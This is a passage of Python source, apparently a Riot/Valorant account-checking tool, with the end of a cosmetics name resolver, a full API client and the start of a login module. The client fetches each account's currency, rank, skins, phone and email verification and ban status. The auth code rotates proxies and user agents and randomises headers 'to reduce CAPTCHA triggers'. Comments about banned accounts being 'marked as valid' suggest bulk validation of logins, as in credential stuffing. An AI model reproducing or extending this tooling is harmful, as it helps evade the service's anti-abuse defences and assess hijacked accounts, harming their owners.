                        skin_uuid = skin.get('uuid', '').lower()
                        if skin_uuid:
                            # Get the display icon - try multiple sources for best compatibility
                            display_icon = None
                            # 1) PRIMARY: skin.displayIcon (the main DisplayIcon PNG)
                            display_icon = skin.get('displayIcon')
                            # 2) FALLBACK: levels[0].displayIcon (some skins only have it in levels)
                            if not display_icon:
                                levels = skin.get('levels', []) or []
                            if levels and len(levels) > 0:
                                display_icon = levels[0].get('displayIcon')
                            # 3) FALLBACK: chroma displayIcon (chroma variants)
                            if not display_icon:
                                chromas = skin.get('chromas', []) or []
                                for chroma in chromas:
                                    chroma_icon = chroma.get('displayIcon')
                                    if chroma_icon and isinstance(chroma_icon, str) and chroma_icon.strip():
                                        display_icon = chroma_icon
                                        break
                            self.weapon_skins[skin_uuid] = {
                                'name': skin.get('displayName', 'Unknown'),
                                'rarity': skin.get('contentTierUuid'),
                                'weapon': weapon.get('displayName', 'Unknown'),
                                'image_url': display_icon if (display_icon and isinstance(display_icon, str) and display_icon.strip()) else None
                            }
            resp = _requests.get("https://valorant-api.com/v1/buddies", timeout=15)
            if resp.status_code == 200:
                data = resp.json().get('data', [])
                for buddy in data:
                    for level in buddy.get('levels', []):
                        level_uuid = level.get('uuid', '').lower()
                        if level_uuid:
                            self.buddies[level_uuid] = {
                                'name': buddy.get('displayName', 'Unknown'),
                                'rarity': buddy.get('contentTierUuid')
                            }
            resp = _requests.get("https://valorant-api.com/v1/playercards", timeout=15)
            if resp.status_code == 200:
                data = resp.json().get('data', [])
                for card in data:
                    card_uuid = card.get('uuid', '').lower()
                    if card_uuid:
                        self.player_cards[card_uuid] = {
                            'name': card.get('displayName', 'Unknown'),
                            'rarity': card.get('contentTierUuid')
                        }
            resp = _requests.get("https://valorant-api.com/v1/sprays", timeout=15)
            if resp.status_code == 200:
                data = resp.json().get('data', [])
                for spray in data:
                    spray_uuid = spray.get('uuid', '').lower()
                    if spray_uuid:
                        self.sprays[spray_uuid] = {
                            'name': spray.get('displayName', 'Unknown'),
                            'rarity': spray.get('contentTierUuid')
                        }
            # Loaded successfully from valorant-api.com public database
            # This provides comprehensive skin data including names, images, and metadata
            pass
        except Exception as e:
            # Failed to load from public API - will use fallback names
            # valorant-api.com is the standard public database for Valorant skins
            # If this fails, skin names may show as UUIDs or "Unknown"
            pass
    
    def get_skin_name(self, skin_uuid: str) -> Optional[Dict]:
        skin_uuid_lower = skin_uuid.lower()
        if skin_uuid_lower in self.weapon_skins:
            skin_info = self.weapon_skins[skin_uuid_lower]
            result = {
                'name': skin_info['name'],
                'weapon': skin_info['weapon'],
                'rarity': RARITY_NAMES.get(skin_info['rarity'], 'Unknown'),
                'uuid': skin_uuid_lower
            }
            # Add image URL if available
            if 'image_url' in skin_info and skin_info['image_url']:
                result['image_url'] = skin_info['image_url']
            return result
        return None
    
    def get_buddy_name(self, buddy_uuid: str) -> Optional[Dict]:
        buddy_uuid_lower = buddy_uuid.lower()
        if buddy_uuid_lower in self.buddies:
            buddy_info = self.buddies[buddy_uuid_lower]
            return {
                'name': buddy_info['name'],
                'rarity': RARITY_NAMES.get(buddy_info['rarity'], 'Unknown')
            }
        return None
    
    def get_player_card_name(self, card_uuid: str) -> Optional[Dict]:
        card_uuid_lower = card_uuid.lower()
        if card_uuid_lower in self.player_cards:
            card_info = self.player_cards[card_uuid_lower]
            return {
                'name': card_info['name'],
                'rarity': RARITY_NAMES.get(card_info['rarity'], 'Unknown')
            }
        return None
    
    def get_spray_name(self, spray_uuid: str) -> Optional[Dict]:
        spray_uuid_lower = spray_uuid.lower()
        if spray_uuid_lower in self.sprays:
            spray_info = self.sprays[spray_uuid_lower]
            return {
                'name': spray_info['name'],
                'rarity': RARITY_NAMES.get(spray_info['rarity'], 'Unknown')
            }
        return None


# =========================
# core/valorant_api.py
# =========================
import base64
import json
import time
from typing import Optional, Dict


class ValorantAPI:
    def __init__(self, access_token: str, entitlements_token: str, puuid: str, region: str, proxy: Optional[dict] = None, log_callback=None, name_resolver: Optional[ValorantNameResolver] = None):
        import requests as _requests
        self.access_token = access_token
        self.entitlements_token = entitlements_token
        self.puuid = puuid
        self.region = region
        self.session = _requests.Session()
        self.session.proxies = proxy if proxy else {}
        self.log_callback = log_callback
        self.name_resolver = name_resolver
        self.shard_map = {
            'eu': 'eu', 'na': 'na', 'ap': 'ap', 'kr': 'kr', 'latam': 'latam', 'br': 'br', 'mena': 'mena'
        }
        region_clean = region.lower() if region else 'eu'
        if region_clean == 'none' or not region_clean:
            region_clean = 'eu'
        elif region_clean == 'tr':
            region_clean = 'eu'
        self.shard = self.shard_map.get(region_clean, 'eu')
        # Silent initialization
    
    def _log(self, message: str, level: str = "INFO"):
        if self.log_callback:
            self.log_callback(message, level)
    
    def _is_dns_error(self, exception: Exception) -> bool:
        """Check if exception is a DNS/connection error"""
        error_str = str(exception).lower()
        dns_keywords = ['nameresolutionerror', 'failed to resolve', 'nodename nor servname', 
                        'connectionerror', 'max retries exceeded', 'connection refused']
        return any(keyword in error_str for keyword in dns_keywords)
    
    def _format_error(self, operation: str, exception: Exception) -> str:
        """Format error message - silent for clean terminal"""
        # Return empty string to avoid cluttering terminal
        return ""
    
    def _get_headers(self) -> dict:
        return {
            'User-Agent': USER_AGENT_GAME,
            'X-Riot-ClientPlatform': CLIENT_PLATFORM,
            'X-Riot-ClientVersion': CLIENT_VERSION,
            'X-Riot-Entitlements-JWT': self.entitlements_token,
            'Authorization': f'Bearer {self.access_token}'
        }
    
    def _get_base_url(self) -> str:
        return f"https://pd.{self.shard}.a.pvp.net"
    
    def get_wallet(self) -> Dict:
        try:
            url = f"{self._get_base_url()}/store/v1/wallet/{self.puuid}"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                balances = data.get('Balances', {})
                vp = balances.get('85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741', 0)
                rd = balances.get('e59aa87c-4cbf-517a-5983-6e81511be9b7', 0)
                return {'vp': vp, 'rd': rd}
            else:
                pass  # Silent fail - return defaults
        except Exception as e:
            pass  # Silent fail - return defaults
        return {'vp': 0, 'rd': 0}
    
    def get_mmr(self) -> Dict:
        """Get MMR/rank information with multiple fallback methods"""
        try:
            # Method 1: Try the main MMR endpoint
            url = f"{self._get_base_url()}/mmr/v1/players/{self.puuid}"
            try:
                response = self.session.get(url, headers=self._get_headers(), timeout=15)
            except Exception as req_error:
                if self._is_dns_error(req_error):
                    if self.log_callback:
                        self.log_callback(f"MMR request failed: DNS resolution error (network/proxy issue) - skipping MMR", "WARNING")
                    return {}
                else:
                    if self.log_callback:
                        self.log_callback(f"MMR request failed: {str(req_error)}", "WARNING")
                    return self._get_mmr_fallback()
            
            # Handle different status codes
            if response.status_code == 200:
                try:
                    data = response.json()
                except Exception as json_error:
                    if self.log_callback:
                        self.log_callback(f"MMR JSON parse error: {str(json_error)}", "WARNING")
                    return self._get_mmr_fallback()
                
                # Try LatestCompetitiveUpdate first (most recent rank)
                latest_competitive = data.get('LatestCompetitiveUpdate')
                if latest_competitive:
                    tier_after = latest_competitive.get('TierAfterUpdate', 0)
                    if tier_after and tier_after > 0:
                        rank_name = RANK_NAMES.get(tier_after, 'Unranked')
                        rr = latest_competitive.get('RankedRatingAfterUpdate', 0)
                        return {'rank': rank_name, 'tier': tier_after, 'rr': rr}
                
                # Fallback to QueueSkills
                queue_skills = data.get('QueueSkills', {})
                if queue_skills:
                    competitive = queue_skills.get('competitive', {})
                    if competitive:
                        # Try CurrentSeasonalInfo first
                        current_season = competitive.get('CurrentSeasonalInfo', {})
                        if current_season:
                            tier = current_season.get('CompetitiveTier', 0)
                            if tier and tier > 0:
                                rank_name = RANK_NAMES.get(tier, 'Unranked')
                                rr = current_season.get('RankedRating', 0)
                                return {'rank': rank_name, 'tier': tier, 'rr': rr}
                        
                        # Try SeasonalInfoBySeasonID
                        seasonal_info = competitive.get('SeasonalInfoBySeasonID', {})
                        if seasonal_info:
                            # Get the latest season
                            latest_season = max(seasonal_info.keys()) if seasonal_info else None
                            if latest_season:
                                season_data = seasonal_info[latest_season]
                                tier = season_data.get('CompetitiveTier', 0)
                                if tier and tier > 0:
                                    rank_name = RANK_NAMES.get(tier, 'Unranked')
                                    rr = season_data.get('RankedRating', 0)
                                    return {'rank': rank_name, 'tier': tier, 'rr': rr}
                
                # Try to get from LatestCompetitiveUpdate even if tier is 0 (might be unranked)
                if latest_competitive:
                    tier_after = latest_competitive.get('TierAfterUpdate', 0)
                    rank_name = RANK_NAMES.get(tier_after, 'Unranked')
                    rr = latest_competitive.get('RankedRatingAfterUpdate', 0)
                    return {'rank': rank_name, 'tier': tier_after, 'rr': rr}
            
            elif response.status_code == 404:
                # No competitive matches - account is unranked
                return {'rank': 'Unranked', 'tier': 0, 'rr': 0}
            
            elif response.status_code in [401, 403]:
                # Authentication/authorization error - try fallback
                if self.log_callback:
                    self.log_callback(f"MMR auth error ({response.status_code}), trying fallback", "WARNING")
                return self._get_mmr_fallback()
            
            else:
                # Other error status codes
                if self.log_callback:
                    try:
                        error_body = response.text[:200]  # First 200 chars
                        self.log_callback(f"MMR API error {response.status_code}: {error_body}", "WARNING")
                    except:
                        self.log_callback(f"MMR API error {response.status_code}", "WARNING")
                return self._get_mmr_fallback()
            
        except Exception as e:
            # Log error for debugging but don't break the flow
            if self.log_callback:
                self.log_callback(f"MMR fetch error: {str(e)}", "WARNING")
            return self._get_mmr_fallback()
        
        return {'rank': 'Unranked', 'tier': 0, 'rr': 0}
    
    def _get_mmr_fallback(self) -> Dict:
        """Fallback method to get MMR using competitive updates endpoint"""
        try:
            comp_url = f"{self._get_base_url()}/mmr/v1/players/{self.puuid}/competitiveupdates?startIndex=0&endIndex=1"
            comp_response = self.session.get(comp_url, headers=self._get_headers(), timeout=15)
            if comp_response.status_code == 200:
                comp_data = comp_response.json()
                matches = comp_data.get('Matches', [])
                if matches and len(matches) > 0:
                    latest_match = matches[0]
                    tier_after = latest_match.get('TierAfterUpdate', 0)
                    if tier_after and tier_after > 0:
                        rank_name = RANK_NAMES.get(tier_after, 'Unranked')
                        rr = latest_match.get('RankedRatingAfterUpdate', 0)
                        return {'rank': rank_name, 'tier': tier_after, 'rr': rr}
            elif comp_response.status_code == 404:
                return {'rank': 'Unranked', 'tier': 0, 'rr': 0}
        except Exception as e:
            if self._is_dns_error(e):
                if self.log_callback:
                    self.log_callback(f"MMR fallback error: DNS resolution error (network/proxy issue) - skipping MMR", "WARNING")
            else:
                if self.log_callback:
                    self.log_callback(f"MMR fallback error: {str(e)}", "WARNING")
        return {'rank': 'Unranked', 'tier': 0, 'rr': 0}
    
    def get_account_level(self) -> Dict:
        try:
            url = f"{self._get_base_url()}/account-xp/v1/players/{self.puuid}"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                progress = data.get('Progress', {})
                level = progress.get('Level', 0)
                xp = progress.get('XP', 0)
                return {'level': level, 'xp': xp}
            else:
                pass  # Silent fail
        except Exception as e:
            pass  # Silent fail
        return {'level': 0, 'xp': 0}
    
    def get_restrictions(self) -> Dict:
        """Check for account bans, locks, and restrictions"""
        try:
            url = f"{self._get_base_url()}/player-restrictions/v1/restrictions"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                restrictions = data.get('restrictions', [])
                
                if not restrictions:
                    return {
                        'has_restrictions': False,
                        'status': 'CLEAN',
                        'restrictions': []
                    }
                
                # Analyze restrictions
                restriction_types = []
                is_banned = False
                is_locked = False
                
                for restriction in restrictions:
                    r_type = restriction.get('restrictionType', '')
                    restriction_types.append(r_type)
                    
                    if 'BAN' in r_type.upper():
                        is_banned = True
                    elif 'LOCK' in r_type.upper() or 'SUSPEND' in r_type.upper():
                        is_locked = True
                
                # Determine status
                if is_banned:
                    status = 'BANNED'
                elif is_locked:
                    status = 'LOCKED'
                else:
                    status = 'RESTRICTED'
                
                return {
                    'has_restrictions': True,
                    'status': status,
                    'restrictions': restrictions,
                    'restriction_types': restriction_types
                }
            else:
                # If we can't check restrictions, return unknown status (don't assume clean)
                # This prevents banned accounts from being marked as valid if API fails
                return {
                    'has_restrictions': None,  # None = unknown, not False
                    'status': 'UNKNOWN',
                    'restrictions': []
                }
        except Exception as e:
            error_msg = self._format_error("Restrictions", e)
            if not self._is_dns_error(e):
                self._log(f"❌ {error_msg}", "ERROR")
            # Return unknown status if API fails - don't assume clean (prevents banned accounts from being marked valid)
            return {
                'has_restrictions': None,  # None = unknown, not False
                'status': 'UNKNOWN',
                'restrictions': []
            }
    
    def get_agents_from_entitlements(self) -> Dict:
        try:
            url = f"{self._get_base_url()}/store/v1/entitlements/{self.puuid}/01bb38e1-da47-4e6a-9b3d-945fe4655707"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                entitlements = data.get('Entitlements', [])
                agent_count = len(entitlements) if entitlements else 0
                self._log(f"\u2705 Agents from entitlements: {agent_count}", "INFO")
                return {'agents': agent_count}
            else:
                response_text = response.text[:500] if response.text else "No response body"
                pass  # Silent fail - will try contracts API
                return None
        except Exception as e:
            error_msg = self._format_error("Agents", e)
            if not self._is_dns_error(e):
                self._log(f"❌ {error_msg}", "ERROR")
            self._log(f"Falling back to contracts API...", "WARNING")
            return None
    
    def get_contracts(self) -> Dict:
        try:
            url = f"{self._get_base_url()}/contracts/v1/contracts/{self.puuid}"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                contracts = data.get('Contracts', [])
                agent_count = 0
                for contract in contracts:
                    progression = contract.get('ProgressionLevelReached', 0)
                    contract_id = contract.get('ContractDefinitionID', '')
                    if progression > 0 and len(contract_id) == 36:
                        agent_count += 1
                self._log(f"\u2705 Agents from contracts: {agent_count}", "INFO")
                return {'agents': agent_count}
            elif response.status_code == 500:
                self._log(f"Contracts API unavailable (HTTP 500)", "ERROR")
                self._log(f"Unable to determine agent count - returning 0", "WARNING")
                return {'agents': 0}
            else:
                response_text = response.text[:500] if response.text else "No response body"
                self._log(f"Contracts fetch error: HTTP {response.status_code}", "ERROR")
                return {'agents': 0}
        except Exception as e:
            error_msg = self._format_error("Contracts", e)
            if not self._is_dns_error(e):
                self._log(f"❌ {error_msg}", "ERROR")
            return {'agents': 0}
    
    def get_all_buddies(self) -> Dict:
        try:
            buddy_type_uuid = "dd3bf334-87f3-40bd-b043-682a57a8dc3a"
            url = f"{self._get_base_url()}/store/v1/entitlements/{self.puuid}/{buddy_type_uuid}"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                entitlements = data.get('Entitlements', []) or []
                buddy_details = []
                if self.name_resolver and entitlements:
                    for entitlement in entitlements:
                        buddy_id = entitlement.get('ItemID')
                        if buddy_id:
                            buddy_info = self.name_resolver.get_buddy_name(buddy_id)
                            if buddy_info:
                                buddy_details.append(buddy_info)
                            else:
                                buddy_details.append({'uuid': buddy_id, 'name': 'Unknown Buddy', 'rarity': 'Unknown'})
                return {'buddies_count': len(entitlements), 'buddies': buddy_details}
            else:
                self._log(f"\u274c Buddies fetch error: HTTP {response.status_code}", "ERROR")
                return {'buddies_count': 0, 'buddies': []}
        except Exception as e:
            error_msg = self._format_error("Buddies", e)
            if not self._is_dns_error(e):
                self._log(f"❌ {error_msg}", "ERROR")
            return {'buddies_count': 0, 'buddies': []}
    
    def get_all_player_cards(self) -> Dict:
        try:
            card_type_uuid = "3f296c07-64c3-494c-923b-fe692a4fa1bd"
            url = f"{self._get_base_url()}/store/v1/entitlements/{self.puuid}/{card_type_uuid}"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                entitlements = data.get('Entitlements', []) or []
                card_details = []
                if self.name_resolver and entitlements:
                    for entitlement in entitlements:
                        card_id = entitlement.get('ItemID')
                        if card_id:
                            card_info = self.name_resolver.get_player_card_name(card_id)
                            if card_info:
                                card_details.append(card_info)
                            else:
                                card_details.append({'uuid': card_id, 'name': 'Unknown Card', 'rarity': 'Unknown'})
                return {'player_cards_count': len(entitlements), 'player_cards': card_details}
            else:
                self._log(f"\u274c Player cards fetch error: HTTP {response.status_code}", "ERROR")
                return {'player_cards_count': 0, 'player_cards': []}
        except Exception as e:
            error_msg = self._format_error("Player cards", e)
            if not self._is_dns_error(e):
                self._log(f"❌ {error_msg}", "ERROR")
            return {'player_cards_count': 0, 'player_cards': []}
    
    def get_all_sprays(self) -> Dict:
        try:
            spray_type_uuid = "d5f120f8-ff8c-4aac-92ea-f2b5acbe9475"
            url = f"{self._get_base_url()}/store/v1/entitlements/{self.puuid}/{spray_type_uuid}"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                entitlements = data.get('Entitlements', []) or []
                spray_details = []
                if self.name_resolver and entitlements:
                    for entitlement in entitlements:
                        spray_id = entitlement.get('ItemID')
                        if spray_id:
                            spray_info = self.name_resolver.get_spray_name(spray_id)
                            if spray_info:
                                spray_details.append(spray_info)
                            else:
                                spray_details.append({'uuid': spray_id, 'name': 'Unknown Spray', 'rarity': 'Unknown'})
                return {'sprays_count': len(entitlements), 'sprays': spray_details}
            else:
                self._log(f"\u274c Sprays fetch error: HTTP {response.status_code}", "ERROR")
                return {'sprays_count': 0, 'sprays': []}
        except Exception as e:
            error_msg = self._format_error("Sprays", e)
            if not self._is_dns_error(e):
                self._log(f"❌ {error_msg}", "ERROR")
            return {'sprays_count': 0, 'sprays': []}
    
    def get_all_skins(self) -> Dict:
        try:
            skins_type_uuid = "de7caa6b-adf7-4588-bbd1-143831e786c6"
            url = f"{self._get_base_url()}/store/v1/entitlements/{self.puuid}/{skins_type_uuid}"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                entitlements = data.get('Entitlements', []) or []
                skin_details = []
                if self.name_resolver and entitlements:
                    for entitlement in entitlements:
                        skin_id = entitlement.get('ItemID')
                        if skin_id:
                            skin_info = self.name_resolver.get_skin_name(skin_id)
                            if skin_info:
                                skin_details.append(skin_info)
                            else:
                                skin_details.append({'uuid': skin_id, 'name': 'Unknown Skin', 'weapon': 'Unknown', 'rarity': 'Unknown'})
                return {'weapon_skins_count': len(entitlements), 'weapon_skins': skin_details}
            else:
                self._log(f"\u274c Weapon skins fetch error: HTTP {response.status_code}", "ERROR")
                return {'weapon_skins_count': 0, 'weapon_skins': []}
        except Exception as e:
            error_msg = self._format_error("Weapon skins", e)
            if not self._is_dns_error(e):
                self._log(f"❌ {error_msg}", "ERROR")
            return {'weapon_skins_count': 0, 'weapon_skins': []}
    
    def get_all_chromas(self) -> Dict:
        try:
            chromas_type_uuid = "e7c63390-eda7-46e0-bb7a-a6abdacd2433"
            url = f"{self._get_base_url()}/store/v1/entitlements/{self.puuid}/{chromas_type_uuid}"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                entitlements = data.get('Entitlements', []) or []
                chroma_details = []
                if entitlements:
                    for entitlement in entitlements:
                        chroma_id = entitlement.get('ItemID')
                        if chroma_id:
                            chroma_details.append({'uuid': chroma_id})
                return {'skin_chromas_count': len(entitlements), 'skin_chromas': chroma_details}
            else:
                self._log(f"\u274c Skin chromas fetch error: HTTP {response.status_code}", "ERROR")
                return {'skin_chromas_count': 0, 'skin_chromas': []}
        except Exception as e:
            error_msg = self._format_error("Skin chromas", e)
            if not self._is_dns_error(e):
                self._log(f"❌ {error_msg}", "ERROR")
            return {'skin_chromas_count': 0, 'skin_chromas': []}
    
    def get_all_skin_levels(self) -> Dict:
        try:
            levels_type_uuid = "3ad1b2b2-acdb-4524-852f-954a76ddae0a"
            url = f"{self._get_base_url()}/store/v1/entitlements/{self.puuid}/{levels_type_uuid}"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                entitlements = data.get('Entitlements', []) or []
                level_details = []
                if entitlements:
                    for entitlement in entitlements:
                        level_id = entitlement.get('ItemID')
                        if level_id:
                            level_details.append({'uuid': level_id})
                return {'skin_levels_count': len(entitlements), 'skin_levels': level_details}
            else:
                self._log(f"\u274c Skin levels fetch error: HTTP {response.status_code}", "ERROR")
                return {'skin_levels_count': 0, 'skin_levels': []}
        except Exception as e:
            error_msg = self._format_error("Skin levels", e)
            if not self._is_dns_error(e):
                self._log(f"❌ {error_msg}", "ERROR")
            return {'skin_levels_count': 0, 'skin_levels': []}
    
    def get_loadout(self) -> Dict:
        try:
            url = f"{self._get_base_url()}/personalization/v2/players/{self.puuid}/playerloadout"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                guns = data.get('Guns', []) or []
                identity = data.get('Identity', {}) or {}
                unique_skins = set()
                skin_details = []
                for gun in guns or []:
                    skin_id = gun.get('SkinID', '')
                    gun_id = gun.get('ID', '')
                    if skin_id and skin_id != gun_id:
                        unique_skins.add(skin_id)
                        skin_detail = {
                            'skin_id': skin_id,
                            'gun_id': gun_id,
                            'chroma_id': gun.get('ChromaID', ''),
                            'charm_id': gun.get('CharmID', ''),
                            'charm_level': gun.get('CharmLevelID', ''),
                            'attachments': gun.get('Attachments', [])
                        }
                        if self.name_resolver:
                            skin_info = self.name_resolver.get_skin_name(skin_id)
                            if skin_info:
                                skin_detail.update({
                                    'name': skin_info['name'],
                                    'weapon': skin_info['weapon'],
                                    'rarity': skin_info['rarity'],
                                    'uuid': skin_info.get('uuid', skin_id.lower()),
                                    'image_url': skin_info.get('image_url')
                                })
                            else:
                                skin_detail.update({
                                    'uuid': skin_id.lower()
                                })
                        else:
                            skin_detail.update({
                                'uuid': skin_id.lower()
                            })
                        skin_details.append(skin_detail)
                result = {'skins': len(unique_skins), 'skin_details': skin_details}
                if self.name_resolver:
                    buddy_id = identity.get('Buddy')
                    if buddy_id:
                        buddy_info = self.name_resolver.get_buddy_name(buddy_id)
                        if buddy_info:
                            result['buddy'] = buddy_info
                    player_card_id = identity.get('PlayerCard')
                    if player_card_id:
                        card_info = self.name_resolver.get_player_card_name(player_card_id)
                        if card_info:
                            result['player_card'] = card_info
                    spray_id = identity.get('Spray')
                    if spray_id:
                        spray_info = self.name_resolver.get_spray_name(spray_id)
                        if spray_info:
                            result['spray'] = spray_info
                return result
            else:
                pass  # Silent fail
        except Exception as e:
            pass  # Silent fail
        return {'skins': 0, 'skin_details': []}
    
    def get_match_history(self) -> Dict:
        try:
            url = f"{self._get_base_url()}/match-history/v1/history/{self.puuid}?startIndex=0&endIndex=15"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                total_matches = data.get('Total', 0)
                history = data.get('History', []) or []
                recent_matches = []
                for match in history[:5]:
                    match_id = match.get('MatchID', '')
                    game_start = match.get('GameStartTime', '')
                    queue_id = match.get('QueueID', '')
                    recent_matches.append({'match_id': match_id, 'game_start': game_start, 'queue_id': queue_id})
                return {'total_matches': total_matches, 'recent_matches': recent_matches}
            else:
                self._log(f"\u274c Match history fetch error: HTTP {response.status_code}", "ERROR")
                return {'total_matches': 0, 'recent_matches': []}
        except Exception as e:
            error_msg = self._format_error("Match history", e)
            if not self._is_dns_error(e):
                self._log(f"❌ {error_msg}", "ERROR")
            return {'total_matches': 0, 'recent_matches': []}
    
    def get_account_penalties(self) -> Dict:
        try:
            url = f"{self._get_base_url()}/restrictions/v3/penalties"
            response = self.session.get(url, headers=self._get_headers(), timeout=15)
            if response.status_code == 200:
                data = response.json()
                penalties = data.get('Penalties', []) or []
                has_penalties = len(penalties) > 0
                penalty_status = "BANNED/RESTRICTED" if has_penalties else "CLEAN"
                return {'has_penalties': has_penalties, 'penalty_status': penalty_status, 'penalties': penalties}
            else:
                self._log(f"\u274c Account penalties fetch error: HTTP {response.status_code}", "ERROR")
                return {'has_penalties': False, 'penalty_status': 'UNKNOWN', 'penalties': []}
        except Exception as e:
            error_msg = self._format_error("Account penalties", e)
            if not self._is_dns_error(e):
                self._log(f"❌ {error_msg}", "ERROR")
            return {'has_penalties': False, 'penalty_status': 'UNKNOWN', 'penalties': []}
    
    def get_phone_status(self) -> Dict:
        try:
            url = "https://auth.riotgames.com/userinfo"
            response = self.session.get(url, headers={'Authorization': f'Bearer {self.access_token}'}, timeout=15)
            if response.status_code == 200:
                data = response.json()
                phone_verified = data.get('phone_number_verified', False)
                email_verified = data.get('email_verified', False)
                phone_status = "VERIFIED" if phone_verified else "UNVERIFIED"
                email_status = "VERIFIED" if email_verified else "UNVERIFIED"
                return {'phone_verified': phone_verified, 'phone_status': phone_status, 'email_verified': email_verified, 'email_status': email_status}
            else:
                self._log(f"\u274c Phone status fetch error: HTTP {response.status_code}", "ERROR")
                return {'phone_verified': False, 'phone_status': 'UNKNOWN', 'email_verified': False, 'email_status': 'UNKNOWN'}
        except Exception as e:
            error_msg = self._format_error("Phone status", e)
            if not self._is_dns_error(e):
                self._log(f"❌ {error_msg}", "ERROR")
            return {'phone_verified': False, 'phone_status': 'UNKNOWN', 'email_verified': False, 'email_status': 'UNKNOWN'}
    
    def fetch_all_details(self) -> Dict:
        details = {}
        wallet = self.get_wallet()
        details.update(wallet)
        time.sleep(0.5)
        level_data = self.get_account_level()
        details.update(level_data)
        time.sleep(0.5)
        mmr = self.get_mmr()
        details.update(mmr)
        time.sleep(0.5)
        agents_data = self.get_agents_from_entitlements()
        if agents_data is None:
            agents_data = self.get_contracts()
        details.update(agents_data)
        time.sleep(0.5)
        loadout = self.get_loadout()
        details.update(loadout)
        time.sleep(0.5)
        buddies_data = self.get_all_buddies()
        details.update(buddies_data)
        time.sleep(0.5)
        cards_data = self.get_all_player_cards()
        details.update(cards_data)
        time.sleep(0.5)
        sprays_data = self.get_all_sprays()
        details.update(sprays_data)
        time.sleep(0.5)
        skins_data = self.get_all_skins()
        details.update(skins_data)
        time.sleep(0.5)
        chromas_data = self.get_all_chromas()
        details.update(chromas_data)
        time.sleep(0.5)
        levels_data = self.get_all_skin_levels()
        details.update(levels_data)
        time.sleep(0.5)
        match_data = self.get_match_history()
        details.update(match_data)
        time.sleep(0.5)
        penalties_data = self.get_account_penalties()
        details.update(penalties_data)
        time.sleep(0.5)
        phone_data = self.get_phone_status()
        details.update(phone_data)
        time.sleep(0.5)
        # Check for bans/locks/restrictions
        restrictions_data = self.get_restrictions()
        details.update(restrictions_data)
        return details


# =========================
# core/auth.py
# =========================
import json as _json
import base64 as _base64
import time as _time
from typing import Optional, Tuple
from urllib.parse import urlparse, parse_qs
from requests.utils import dict_from_cookiejar, cookiejar_from_dict


class RiotAuth:
    # Session pool for reuse (thread-safe)
    _session_pool = []
    _session_pool_lock = threading.Lock()
    _max_pool_size = 10
    
    # Class-level rate limiter for Riot login requests (shared across all instances)
    _login_lock = threading.Lock()
    _last_login_time = 0
    _min_login_interval = 0.2  # Minimum 0.2 seconds between login requests (5 requests/second max)
    
    def __init__(self, proxy: Optional[dict] = None, log_callback=None, session_cookies: Optional[dict] = None, session_headers: Optional[dict] = None, user_agent: Optional[str] = None):
        import requests as _requests
        # Try to reuse a session from pool if available
        self.session = None
        with RiotAuth._session_pool_lock:
            if RiotAuth._session_pool:
                self.session = RiotAuth._session_pool.pop()
                # Update proxy if different
                if proxy:
                    self.session.proxies = proxy
            else:
                self.session = _requests.Session()
                if proxy:
                    self.session.proxies = proxy
        
        if session_cookies:
            self.session.cookies = cookiejar_from_dict(session_cookies)
        if session_headers:
            self.session.headers.update(session_headers)
        
        self.access_token = None
        self.id_token = None
        self.entitlements_token = None
        self.puuid = None
        self.region = None
        self.rqdata = None
        self.log_callback = log_callback
        self.base_auth_url = "https://auth.riotgames.com"
        # Rotate user agent randomly
        self.user_agent = user_agent or random.choice(USER_AGENTS)
    
    def get_session_state(self) -> dict:
        return {
            'cookies': dict_from_cookiejar(self.session.cookies),
            'headers': dict(self.session.headers),
            'user_agent': self.user_agent
        }
    
    def _log(self, message: str, level: str = "INFO"):
        if self.log_callback:
            self.log_callback(message, level)
    
    def _generate_headers(self, content_type: str = "application/json") -> dict:
        """Generate headers with randomization to reduce CAPTCHA triggers"""
        headers = {
            'User-Agent': self.user_agent,
            'Content-Type': content_type,
            'Accept': 'application/json',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.8']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Origin': 'https://auth.riotgames.com',
            'Referer': 'https://auth.riotgames.com/',
        }
        # Add random header variations
        if random.random() < 0.3:  # 30% chance
            headers['DNT'] = '1'
        if random.random() < 0.2:  # 20% chance
            headers['Sec-Fetch-Dest'] = 'empty'
            headers['Sec-Fetch-Mode'] = 'cors'
            headers['Sec-Fetch-Site'] = 'same-origin'
        return headers
    
    def __del__(self):
        """Return session to pool for reuse"""
        try:
            if self.session:
                with RiotAuth._session_pool_lock:
                    if len(RiotAuth._session_pool) < RiotAuth._max_pool_size:
                        # Clear sensitive data but keep session
                        self.session.cookies.clear()
                        RiotAuth._session_pool.append(self.session)
        except:
            pass
    
    def _decode_token_data(self, token: str) -> Optional[dict]:
        try:
            parts = token.split('.')
            if len(parts) < 2:
                return None
            payload = parts[1]
            padding = 4 - (len(payload) % 4)
            if padding != 4:
                payload += '=' * padding
            decoded = _base64.urlsafe_b64decode(payload)
            return _json.loads(decoded)
        except Exception as e:
            print(f"Token decode error: {e}")
            return None
    
    def initialize_auth(self, username: str) -> Tuple[bool, str]:
        try:
            auth_payload = {
                "acr_values": "",
                "claims": "",
                "client_id": "riot-client",
                "code_challenge": "",
                "code_challenge_method": "",
                "login_token": None,
                "nonce": self._generate_nonce(),
